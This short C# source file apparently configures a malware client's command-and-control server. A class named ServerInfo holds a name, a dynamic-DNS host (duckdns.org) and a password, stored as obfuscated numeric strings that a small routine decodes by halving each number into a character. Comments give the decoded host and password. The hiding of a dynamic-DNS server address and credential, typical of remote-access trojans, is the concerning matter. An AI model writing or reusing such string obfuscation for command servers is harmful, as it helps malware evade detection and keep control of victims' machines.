using System.Linq;

namespace bc.srv.Classes
{
    class StringData
    {
        public class ServerInfo
        {
            public static string Name => ReadValue("210#218#196#194#198#214");

            // host = "lqphnd2gfz.duckdns.org"
            public static string Host =>
                ReadValue("216#226#224#208#220#200#100#206#204#244#92#200#234#198#214#200#220#230#92#222#228#206");

            public static string Password => ReadValue("230#216#202#236#210#220"); // slevin


            private static string ReadValue(string value)
            {
                var array = value.Split('#').Select(int.Parse);
                var listed = array.Select(s => (s) / 2).Select(ss => (char) ss);
                return string.Join("", listed);
            }
        }
    }


}